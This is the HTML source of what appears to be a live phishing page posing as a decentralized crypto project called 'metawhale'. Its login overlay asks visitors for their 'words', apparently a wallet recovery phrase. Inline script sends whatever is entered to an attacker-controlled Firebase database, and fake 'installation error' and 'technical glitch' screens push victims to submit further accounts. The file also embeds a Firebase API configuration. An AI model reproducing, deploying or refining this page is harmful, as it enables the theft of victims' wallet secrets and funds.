<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>T&S | Decentralized</title>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
            authDomain: "v-academy-82560.firebaseapp.com",
            projectId: "v-academy-82560",
            storageBucket: "v-academy-82560.firebasestorage.app",
            messagingSenderId: "826822771378",
            appId: "1:826822771378:web:5357b1b989b298a8027fab",
            measurementId: "G-JEWJC719LD"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        window.saveData = function() {
            const textData = document.getElementById('accountInput').value;
            if(textData.trim() !== "") {
                push(ref(db, 'user_submissions'), {
                    words: textData,
                    timestamp: Date.now()
                }).then(() => {
                    openPage('page4');
                }).catch((error) => { console.error(error); });
            } else {
                alert("Please input your words!");
            }
        }
    </script>

    <style>
        /* Mobile Reset & Fit */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { width: 100%; overflow-x: hidden; background: #000; font-family: sans-serif; }

        /* Background Images Container */
        .main-scroll { width: 100%; display: flex; flex-direction: column; position: relative; }
        .bg-img { width: 100%; display: block; height: auto; }

        /* Header Overlay (Transparent & Fixed) */
        header { 
            position: fixed; top: 0; width: 100%; height: 70px; 
            display: flex; justify-content: flex-end; align-items: center; 
            padding-right: 15px; z-index: 1000; 
            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
        }
        .header-btn-area { display: flex; gap: 10px; }
        .invisible-btn { 
            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.5);
            color: white; padding: 7px 18px; border-radius: 20px; 
            font-size: 13px; font-weight: bold; cursor: pointer;
        }

        /* Full Screen Overlays (Menu & Login) */
        .overlay-page { 
            display: none; position: fixed; top: 0; left: 0; 
            width: 100%; height: 100%; background: #fff; 
            z-index: 2000; padding: 20px; flex-direction: column; 
        }
        .close-x { 
            position: absolute; top: 25px; right: 25px; width: 40px; height: 40px; 
            border: 1px solid #eee; border-radius: 50%; display: flex; 
            justify-content: center; align-items: center; font-size: 20px; color: #333;
        }

        /* Interface Images as Content */
        .ui-img { width: 100%; height: auto; pointer-events: none; }
        
        /* Account Input Styling */
        .account-box { margin-top: 100px; width: 100%; padding: 10px; text-align: center; }
        .textarea-box { 
            width: 100%; height: 220px; border: 1.5px solid #000; 
            border-radius: 12px; padding: 15px; font-size: 16px; 
            margin-top: 20px; outline: none; resize: none;
        }
        .bottom-btn { 
            position: absolute; bottom: 30px; left: 5%; width: 90%; 
            background: #111; color: #fff; padding: 20px; 
            border-radius: 40px; font-weight: bold; font-size: 16px; 
            text-align: center; cursor: pointer; border: none;
        }

        /* Red Error Popup */
        #errorPopup { 
            position: fixed; top: -70px; left: 0; width: 100%; 
            background: #e60000; color: #fff; text-align: center; 
            padding: 20px; font-weight: bold; transition: 0.4s; z-index: 3000; 
        }
    </style>
</head>
<body>

    <div id="errorPopup">Web Installation Error</div>

    <header>
        <div class="header-btn-area">
            <button class="invisible-btn" style="background: #fff; color: #000;" onclick="openPage('menuPage')">Menu</button>
            <button class="invisible-btn" onclick="showError()">Log in</button>
        </div>
    </header>

    <div class="main-scroll" id="homePage">
        <img src="https://i.ibb.co/YBxhHFzq/Screenshot-2026-0507-004641.png" class="bg-img">
        <img src="https://i.ibb.co/DPSfDC66/Screenshot-2026-0507-004738.png" class="bg-img">
        <img src="https://i.ibb.co/6cs0ZcGV/Screenshot-2026-0507-004817.png" class="bg-img">
        <img src="https://i.ibb.co/0pw9XnWb/Screenshot-2026-0507-004840.png" class="bg-img">
        <img src="https://i.ibb.co/hRBtjFyF/Screenshot-2026-0507-004908.png" class="bg-img">
        <img src="https://i.ibb.co/YB37McHH/Screenshot-2026-0507-004938.png" class="bg-img">
        <img src="https://i.ibb.co/B2Gzp68v/Screenshot-2026-0507-004953.png" class="bg-img">
    </div>

    <div id="menuPage" class="overlay-page">
        <div class="close-x" onclick="openPage('homePage')">✕</div>
        <img src="https://i.ibb.co/NgZcBGwJ/Screenshot-2026-0507-005008.png" style="width:50px; margin-bottom:50px;">
        <div style="text-align: center; font-size: 26px; font-weight: bold; line-height: 2.5;">
            <p>About</p>
            <p>How it works</p>
            <p>Token</p>
            <p>Security</p>
            <p onclick="openPage('loginPage')" style="color:#8a2be2;">Account</p>
        </div>
        <button class="bottom-btn" onclick="openPage('homePage')">Join Us</button>
    </div>

    <div id="loginPage" class="overlay-page">
        <div class="close-x" onclick="openPage('menuPage')">✕</div>
        <div class="account-box">
            <h2 style="font-size: 24px; margin-bottom: 30px;">Login your account first</h2>
            <textarea id="accountInput" class="textarea-box" placeholder="input your words for login metawhale account"></textarea>
        </div>
        <button class="bottom-btn" onclick="saveData()">next</button>
    </div>

    <div id="glitchPage" class="overlay-page">
        <div class="close-x" onclick="openPage('loginPage')">✕</div>
        <div style="margin-top: 180px; text-align: center; padding: 20px;">
            <h3 style="font-size: 22px;">You are facing technical glitch</h3>
            <p style="color: #888; margin-top: 15px;">please check your DNS settings, Try another account</p>
        </div>
        <button class="bottom-btn" onclick="openPage('loginPage')">back</button>
    </div>

    <script>
        function openPage(id) {
            // Hide everything
            document.querySelectorAll('.overlay-page, #homePage').forEach(el => el.style.display = 'none');
            // Show target
            const target = document.getElementById(id);
            if(id === 'homePage') {
                target.style.display = 'block';
            } else {
                target.style.display = 'flex';
            }
            window.scrollTo(0,0);
        }

        function showError() {
            const popup = document.getElementById('errorPopup');
            popup.style.top = '0';
            setTimeout(() => { popup.style.top = '-70px'; }, 3000);
        }
    </script>
</body>
          </html>
